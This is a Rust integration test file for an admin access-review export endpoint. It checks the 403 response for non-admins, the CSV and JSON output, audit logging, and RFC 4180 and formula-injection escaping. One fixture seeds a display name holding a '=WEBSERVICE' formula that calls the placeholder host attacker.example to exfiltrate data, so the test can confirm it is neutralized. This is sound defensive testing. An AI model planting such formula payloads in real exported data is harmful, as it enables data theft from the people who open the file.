//! Backend integration tests for the admin access-review CSV/JSON endpoint.
//! Covers the two authorization paths plus the format-switch contract:
//!
//! - Non-admin principal: 403
//! - Admin principal, format=csv: 200 + RFC 4180 CSV body
//! - Admin principal, format=json: 200 + JSON array

use axum::body::Body;
use axum::http::{Request, StatusCode, header};
use http_body_util::BodyExt as _;
use spacebot::api::ApiState;
use spacebot::api::test_support::build_test_router_entra;
use spacebot::auth::context::{AuthContext, PrincipalType};
use spacebot::auth::repository::{upsert_team, upsert_user_from_auth};
use spacebot::auth::testing::mint_mock_token;
use std::sync::Arc;
use tower::ServiceExt as _;

fn user(oid: &str, roles: Vec<&str>) -> AuthContext {
    AuthContext {
        principal_type: PrincipalType::User,
        tid: Arc::from("t1"),
        oid: Arc::from(oid),
        roles: roles.into_iter().map(Arc::from).collect(),
        groups: vec![],
        groups_overage: false,
        display_email: Some(Arc::from(format!("{oid}@example.com").as_str())),
        display_name: Some(Arc::from(format!("User {oid}").as_str())),
    }
}

#[tokio::test]
async fn non_admin_cannot_read_access_review() {
    let (state, pool) = ApiState::new_test_state_with_mock_entra().await;
    let alice = user("alice", vec!["SpacebotUser"]);
    upsert_user_from_auth(&pool, &alice).await.unwrap();
    let app = build_test_router_entra(state);
    let req = Request::builder()
        .uri("/api/admin/access-review?format=csv")
        .header(
            header::AUTHORIZATION,
            format!("Bearer {}", mint_mock_token(&alice)),
        )
        .body(Body::empty())
        .unwrap();
    let res = app.oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn admin_gets_csv_report() {
    let (state, pool) = ApiState::new_test_state_with_mock_entra().await;
    let alice = user("alice", vec!["SpacebotUser"]);
    let admin = user("admin", vec!["SpacebotAdmin"]);
    upsert_user_from_auth(&pool, &alice).await.unwrap();
    upsert_user_from_auth(&pool, &admin).await.unwrap();
    let team = upsert_team(&pool, "grp-1", "Platform").await.unwrap();
    sqlx::query(
        "INSERT INTO team_memberships (principal_key, team_id, source) VALUES (?, ?, 'token_claim')",
    )
    .bind(alice.principal_key())
    .bind(&team.id)
    .execute(&pool)
    .await
    .unwrap();

    let app = build_test_router_entra(state);
    let req = Request::builder()
        .uri("/api/admin/access-review?format=csv")
        .header(
            header::AUTHORIZATION,
            format!("Bearer {}", mint_mock_token(&admin)),
        )
        .body(Body::empty())
        .unwrap();
    let res = app.oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = res.into_body().collect().await.unwrap().to_bytes();
    let csv = String::from_utf8(body.to_vec()).unwrap();
    assert!(
        csv.starts_with("principal_key,display_name"),
        "CSV header missing: {csv}"
    );
    assert!(csv.contains("alice"));
    assert!(csv.contains("Platform"));

    // AdminRead audit event must be persisted. Polls the chain because
    // the handler emits via tokio::spawn (fire-and-forget). 50ms x 5 is
    // generous for an in-memory SQLite write.
    type AuditRow = (String, String, Option<String>, Option<String>, String);
    let mut audit_row: Option<AuditRow> = None;
    for _ in 0..5 {
        if let Ok(row) = sqlx::query_as::<_, AuditRow>(
            "SELECT principal_key, action, resource_type, resource_id, metadata_json \
             FROM audit_events WHERE action = ? ORDER BY seq DESC LIMIT 1",
        )
        .bind("admin_read")
        .fetch_one(&pool)
        .await
        {
            audit_row = Some(row);
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    let (audited_principal, audited_action, audited_rt, _, audited_metadata) =
        audit_row.expect("admin_read audit event was not appended");
    assert_eq!(audited_principal, admin.principal_key());
    assert_eq!(audited_action, "admin_read");
    assert_eq!(audited_rt.as_deref(), Some("access_review"));
    let metadata: serde_json::Value =
        serde_json::from_str(&audited_metadata).expect("metadata_json is valid JSON");
    assert!(
        metadata["row_count"].as_u64().is_some(),
        "audit metadata must record row_count: {metadata}",
    );
}

#[tokio::test]
async fn csv_escaping_handles_quotes_commas_and_formula_injection() {
    // I5: SOC 2 evidence is consumed by spreadsheet apps; a hostile
    // display_name containing `=`, `,`, `"`, or a leading formula
    // prefix must not corrupt the CSV or get evaluated as a formula.
    let (state, pool) = ApiState::new_test_state_with_mock_entra().await;
    let admin = user("admin_csv", vec!["SpacebotAdmin"]);
    upsert_user_from_auth(&pool, &admin).await.unwrap();

    // Inject a hostile display_name post-upsert. Real-world equivalents
    // come from Entra preferred_username / displayName mutations.
    sqlx::query("UPDATE users SET display_name = ? WHERE principal_key = ?")
        .bind("=WEBSERVICE(\"http://attacker.example/exfil\")")
        .bind(admin.principal_key())
        .execute(&pool)
        .await
        .unwrap();

    // Seed a second user whose name contains comma + quote so the
    // RFC 4180 path is exercised independently of the formula guard.
    let bob = user("bob", vec!["SpacebotUser"]);
    upsert_user_from_auth(&pool, &bob).await.unwrap();
    sqlx::query("UPDATE users SET display_name = ? WHERE principal_key = ?")
        .bind("Last, \"First\"")
        .bind(bob.principal_key())
        .execute(&pool)
        .await
        .unwrap();

    let app = build_test_router_entra(state);
    let req = Request::builder()
        .uri("/api/admin/access-review?format=csv")
        .header(
            header::AUTHORIZATION,
            format!("Bearer {}", mint_mock_token(&admin)),
        )
        .body(Body::empty())
        .unwrap();
    let res = app.oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = res.into_body().collect().await.unwrap().to_bytes();
    let csv = String::from_utf8(body.to_vec()).unwrap();

    // Formula-injection guard: the leading `=` must be neutralized via
    // a single-quote sigil inside the quoted value. Excel/Sheets render
    // the cell as text, never as a formula.
    assert!(
        csv.contains("\"'=WEBSERVICE("),
        "expected single-quote sigil before formula prefix; CSV was: {csv}",
    );
    // RFC 4180: a value containing a comma OR a double-quote must be
    // wrapped in double-quotes, with embedded quotes doubled.
    assert!(
        csv.contains("\"Last, \"\"First\"\"\""),
        "expected RFC 4180 escape of comma + embedded quotes; CSV was: {csv}",
    );
    // Sanity: the unescaped formula MUST NOT appear at the start of any
    // field (i.e. immediately after a comma or newline).
    assert!(
        !csv.contains(",=WEBSERVICE"),
        "formula prefix appeared unescaped after a field separator: {csv}",
    );
    assert!(
        !csv.contains("\n=WEBSERVICE"),
        "formula prefix appeared unescaped at the start of a row: {csv}",
    );
}

#[tokio::test]
async fn admin_gets_json_report() {
    let (state, pool) = ApiState::new_test_state_with_mock_entra().await;
    let alice = user("alice", vec!["SpacebotUser"]);
    let admin = user("admin", vec!["SpacebotAdmin"]);
    upsert_user_from_auth(&pool, &alice).await.unwrap();
    upsert_user_from_auth(&pool, &admin).await.unwrap();
    let team = upsert_team(&pool, "grp-2", "Security").await.unwrap();
    sqlx::query(
        "INSERT INTO team_memberships (principal_key, team_id, source) VALUES (?, ?, 'token_claim')",
    )
    .bind(alice.principal_key())
    .bind(&team.id)
    .execute(&pool)
    .await
    .unwrap();

    let app = build_test_router_entra(state);
    let req = Request::builder()
        .uri("/api/admin/access-review?format=json")
        .header(
            header::AUTHORIZATION,
            format!("Bearer {}", mint_mock_token(&admin)),
        )
        .body(Body::empty())
        .unwrap();
    let res = app.oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = res.into_body().collect().await.unwrap().to_bytes();
    let v: serde_json::Value = serde_json::from_slice(&body).expect("valid JSON array");
    let arr = v.as_array().expect("top-level array");
    assert!(!arr.is_empty(), "expected rows for alice + admin");
    let alice_row = arr
        .iter()
        .find(|r| r["principal_key"].as_str() == Some(alice.principal_key().as_str()))
        .expect("alice row present");
    let teams = alice_row["teams"].as_array().expect("teams array");
    assert!(
        teams.iter().any(|t| t.as_str() == Some("Security")),
        "expected Security team in alice's teams list, got {teams:?}",
    );
}
